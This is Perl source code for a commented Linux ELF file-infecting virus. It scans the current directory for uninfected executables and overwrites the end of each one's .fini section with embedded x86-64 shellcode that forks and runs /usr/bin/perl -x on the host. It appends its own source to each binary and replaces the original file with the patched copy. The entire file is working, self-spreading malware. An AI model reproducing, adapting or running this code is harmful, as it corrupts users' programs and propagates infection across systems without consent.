#!/usr/bin/perl
# linkin.pl (commented) - patch .fini vx - by isra
use File::Copy;

sub r{read$_[0],$x,$_[1];return$x}
sub k{seek$_[0],$_[1],"SEEK_SET"}
sub w{syswrite$_[0],$_[1]}

$p1="\xe8\x58\x01\x00\x00\x49\x20\x74\x72\x69\x65\x64\x20\x73\x6f\x20\x68\x61\x72\x64\x20\x61\x6e\x64\x20\x67\x6f\x74\x20\x73\x6f\x20\x66\x61\x72\x2c\x20\x62\x75\x74\x20\x69\x6e\x20\x74\x68\x65\x20\x65\x6e\x64\x20\x69\x74\x20\x64\x6f\x65\x73\x6e\x27\x74\x20\x65\x76\x65\x6e\x20\x6d\x61\x74\x74\x65\x72\x0a\x00\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x00\x2d\x78\x00";
$p2="\x00\x48\x31\xc0\x48\x31\xd2\xfe\xc0\x48\x89\xc7\x5e\xb2\x46\x0f\x05\x48\x31\xc0\xb8\x39\x00\x00\x00\x0f\x05\x85\xc0\x75\x2f\x48\x8d\x7e\x47\x48\x31\xd2\x52\x48\x8d\x5e\x58\x53\x48\x8d\x5e\x55\x53\x57\x48\x89\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\x48\x31\xd2\xb8\x3c\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\x31\xd2\xc3";

# payload size
$s=length($p1)+length($p2)+255;

# loop current directory
foreach $f(glob qq{"./*"}){
	next if(!-f$f);
	# skip self
	next if($f eq$0);

	# file size, vx content and vx end delimiter
	$fs=(stat$f)[7];
	$vx="\n";
	$r="__"."END__";

	# get vx content
	$fn=0;
	open my$vh,'<',$0;
	while(<$vh>){
		$fn++ if($_=~"#!/usr/bin/perl");
		$vx.=$_ if($fn);
		last if($_=~/$r/);
	}
	$vxs=length($vx);

	# read elf header
	open$h,'<:raw',$f;
	my@e=unpack("C a a a C C C C C x7 S S I q q q I S S S S S S",r($h,64));
	# skip non-elfs
	next if($e[0]!=127&&$e[1]!~'E'&&$e[2]!~"L"&&$e[3]!~"F");

	# lazy check for infected files
	$q=0;
	open$qh,'<:raw',$f;
	while(<$qh>){
		if($_=~"#!/usr/bin/perl"){
			$q++;last
		}
	}
	next if($q);

	# seek to e_shoff and skip first 13 section headers
	k($h,$e[14]);r($h,$e[19]*13);

	# .fini should be in 14th-18th entries
	for($i=0;$i<5;$i++){
		@u=unpack("I I q q q q I I q q",r($h,$e[19]));
		# find .fini by checking sh_flags = 6 (AX) and sh_addralign = 4 
		if($u[2]==6&&$u[8]==4){
			($n,$y,$z)=(13+$i,$u[4],$u[5]);last
		}
	}
	next if(!$n); # .fini not found, skip

	# read next section header entry (.rodata)
	@u=unpack("I I q q q q I I q q",r($h,$e[19]));

	# check if vx size + payload fits between .rodata and .fini
	# free space: .rodata sh_offset - (.fini sh_offset + .fini sh_size)
	next if($u[4]-($y+$z)<$s+$vxs);

	# tmp copy for patched elf
	open$t,'>:raw',"$f.t";
	# read everything until the end of .fini code, except for the last byte
	# which should contain the return instruction 0xc3
	k($h,0);w($t,r($h,$y+$z-1));

	# write payload replacing last byte of .fini code
	r($h,$s);w($t,$p1);

	# adjust payload on-the-fly to include the infected elf filename
	# filename . (255-filename) null bytes
	@c=split//,$f;
	for($i=0;$i<length($f);$i++){ w($t,pack("C",(hex unpack("H2",$c[$i]))))}
	for($i=length($f);$i<255;$i++){ w($t,pack("C",0x0))}

	# write remaining payload and vx, then copy rest of binary
	w($t,$p2);w($t,$vx);
	r($h,$vxs);w($t,r($h,$fs-($y+$z-1+$s+$vxs)));

	# delete original binary and replace it with modified copy
	unlink$f;copy("$f.t",$f);unlink"$f.t";chmod 0755,$f;}
__END__
